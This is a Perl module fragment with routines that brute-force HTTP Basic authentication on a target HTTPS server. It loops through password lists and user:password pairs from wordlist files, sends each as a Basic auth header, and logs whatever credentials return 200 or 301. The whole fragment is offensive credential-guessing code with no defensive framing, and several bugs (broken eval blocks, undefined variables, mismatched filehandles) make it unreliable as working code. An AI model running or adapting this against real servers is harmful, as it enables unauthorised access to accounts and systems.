#*****************************************************************************
# HTTPS  password bruteforce main
#******************************************************************************
sub brute_ssl
             {
             		
     log_print ( "Traing brute with pass only/n" ,"i");
   if (https_brute_p())
   {
   	log_print ( "Traing brute with user:pass pair/n" ,"i");
   	https_brute_up()
   }
             }
#*****************************************************************************
# HTTPS  password bruteforce
#******************************************************************************
sub https_brute_p {
	

my  $pass,  @password, $auth;

open(PASSFILE, "<$passfile") || die " Cannot open the password file $passfile: $!\n";
        chomp(@password = <PASSFILE>);
close(PASSFILE);

		foreach $pass (@password)
		{
  
eval {
local $SIG{'ALRM'} = sub { die "Timeout Alarm" };
alarm ($timeout); 

 ($page, $result, %headers) = get_https($target, 443, '/',
	      make_headers(Authorization =>
			   'Basic ' . MIME::Base64::encode(":$pass",''))
	      );
	      print "Tryng $pass\n $result \n ";
                
    if ($EVAL_ERROR and ($EVAL_ERROR eq 'Timeout Alarm')) {
        print "**** Time Out\n";
        
    }
    if ($page, $result, @headers) {
    	
    	
     if ($result =~/200 Ok/i or $result =~/301/i) {
	 
   log_print ( "HTTPS without username password: $pass \n" , "c");
   return (0),
   exit;
    }
    }

		}
	}
}


#*****************************************************************************
# HTTPS user an password bruteforce
#******************************************************************************
sub https_brute_up {

my $user, $pass, @users, @password, $auth;

open(PASSFILE, "<$passfile") || die " Cannot open the password file $passfile: $!\n";
        chomp(@password = <PASSFILE>);
close(PASSFILE);
open(USERSFILE, "<$usersfile") || die " Cannot open the password file $passfile: $!\n";
        chomp(@users = <USERSFILE>);
close(PASSFILE);

foreach $user (@users) 
	{
		foreach $pass (@password)
		{
  

chomp($auth);
eval {
local $SIG{'ALRM'} = sub { die "Timeout Alarm" };
alarm ($timeout); 

 ($page, $result, %headers) = get_https($target, 443, '/',
	      make_headers(Authorization =>
			   'Basic ' . MIME::Base64::encode("$user:$pass",''))
	      );
                
    if ($EVAL_ERROR and ($EVAL_ERROR eq 'Timeout Alarm')) {
        print "**** Time Out\n";
        
    }
    if ($page, $response, @headers) {
    	
    	if ($result =~/200 Ok/i or $result =~/301/i) {
	 
   log_print ( "HTTPS without username password: $pass \n" , "c");
   return (0),
   exit;
    }

    }
}
		}
	}
}


 1;
